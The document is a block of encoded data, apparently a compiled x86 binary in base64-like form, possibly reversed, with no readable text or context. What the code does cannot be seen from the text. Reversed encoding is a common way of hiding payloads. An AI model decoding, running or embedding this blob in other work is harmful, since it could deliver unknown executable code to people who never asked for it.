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QQeAZB7ghRLm1//jZOoD1B0BQQewYB7QhRLm1//j5SoD1B0BQQegYB7AhRLm1//jZXoD1B0BQQeQYB7wgRL6Hd2XIC1toVsvYV/v4wd5VW//Pm/huVHQHAB5Bg1sDC2tYW//PmRiOUHQHAB5BfFsDBGtYW//PmjiOUHQHAB5BeFsjBLWDd2XIC1toVsvYV/v4wd5FLEP4//jpxoDAAAgqt////YGN6AAAAka7///PmcjOAAAAo2+///j55oDAAAwpt////YKP6AAAAYa7///Pm9jOAAAAl2+///nJCoDAAAApt////ZOB6AAAAMa7///fmegOAAAAi2+///nZKoDAAAQot////ZSD6AAAAAa7/AR8g//fmChOf29///npSojnd////ZKF60Z3///fmahOc29///npYozmd////ZqG6oZ3///fmyhOZ29///npeoDmd////ZKI6cZ3///fmKiOW29///npkoTld////ZqJ6QZ3///fmiiOT29///npqojkd////ZKL6EZ3///fm6iOQ29PQEP4//nZxozjd////Z2M64Y3///fmVjOH29///nZ3oTjd////ZWO6wY3///fmtjOL29///nZ9ojid////Z2P6kY3///vmFgOI29///rZDobz///vmUgOG29///rJHoThd////aSC6QY3///vmsgOD29///rJNojgd////ayD6EY3/AAQABS4D2XIC1toVsvYV/v4wJ3PchNI+Nt4B0BA/9BIHEP4//7vFozQd/DRd/TRd/jRd/zRd/DSd/DfTNSSd////0hF6w3UjIU3/Qw+gsvYV/v4wJ///jRG6NPD/Nt4We9F7l14xLm1//rJrob1B0N/O4vIAAFOKV8PH19PC19PD19PE19PF19PD1lI30N/OYQ8gwvIAAQBzojRd/DFD19fUQ0UjTNlH0hRR7c06APDB19P+DmFAAQBpozRd/jRRJSAQLewiIUHGdlDHFlIFAt4BLiQdc0VO2PTdrnF+Ft4//rPyoPF+FlIAAFOLV8PC19/UQRRd/HBdAXo1/jRd/HgaMU3/QU3/TdFDEP4///IXoPFAqB1PE0Ya0tdhYvICAPIAA0d3AccC0N8OZBAAIEA6QFx6AAAzMDwxcQ3w7Q8iAAwFwg+E3BAAEAQPI8DRNSzd/9//w/fg84HAAAwqE+w+7g/iW/PG19PUAAAABU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